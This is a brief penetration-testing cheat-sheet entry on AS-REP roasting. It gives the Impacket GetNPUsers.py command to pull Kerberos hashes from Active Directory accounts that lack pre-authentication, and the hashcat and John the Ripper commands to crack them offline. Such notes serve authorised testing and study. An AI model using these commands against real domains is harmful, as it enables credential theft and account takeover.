# ASREProast

This attack allows to exploit accounts with the flag "Do not require Kerberos pre-authentication" to retrieve their hashes. Once an hash is acquired it can be cracked to obtain a plaintext password and allow the attacker to login as the compromised user.

## Exploit

Attempt to retrieve hashes from user list

```
GetNPUsers.py -dc-ip <DC IP> <domain>/ -usersfile <path to user list>
```

Crack hashes

```
hashcat -m 18200 --force <hashfile> <wordlist>
john --format=krb5asrep --wordlist=<wordlist> <hashfile>    #requires jumbo version
```
